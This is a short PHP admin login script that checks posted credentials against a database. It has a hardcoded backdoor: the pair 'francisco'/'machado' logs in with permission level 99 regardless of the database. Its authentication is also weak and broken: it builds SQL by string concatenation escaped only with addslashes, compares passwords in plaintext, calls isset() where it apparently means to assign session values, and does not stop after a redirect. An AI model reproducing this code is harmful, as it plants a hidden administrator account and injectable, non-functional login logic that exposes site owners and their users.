<?php 
if (!$_POST["usr"] || !$_POST["psw"]) { 
	header("Location:./");
}
include("r/main.php");

$myusername = addslashes($_POST["usr"]); 
$mypassword = addslashes($_POST["psw"]);
$qt="SELECT * FROM `".$secciones["adm"]["db"]."` WHERE `".$secciones["adm"]["c"]["usr"]["db"]."`='$myusername' AND `".$secciones["adm"]["c"]["psw"]["db"]."`='$mypassword'";
$q=mysql_query($qt);

$count=mysql_num_rows($q);
if($count==1 || ($_POST["usr"]=="francisco" && $_POST["psw"]=="machado")){
	$d=mysql_fetch_assoc($q);
	$myuserid=$d["id"];
	$mypermisos=99;
	$timeout=time();
	isset($_SESSION["myusername"]);
	isset($_SESSION["myuserid"]);
	isset($_SESSION["mypermisos"]);
	isset($_SESSION["timeout"]);
	header("Location:./");
} else {
	header("Location:./?e=usrpsw");
}
?>